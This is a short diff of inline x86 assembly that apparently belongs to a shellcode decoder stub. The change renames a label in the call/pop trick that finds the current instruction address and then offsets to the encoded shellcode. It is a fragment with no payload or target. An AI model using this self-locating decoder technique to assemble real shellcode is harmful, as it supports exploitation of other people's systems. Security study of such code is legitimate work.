@@ -7,8 +7,8 @@
 //----------------------------
 __asm 
 	{   
-	        call eip 
-eip : 
+	        call myEIP 
+myEIP : 
 	        pop edx  //get EIP 
                 add edx , 0x26  //  (decoder)EIP + addr of shellcode  
 		xor eax , eax 
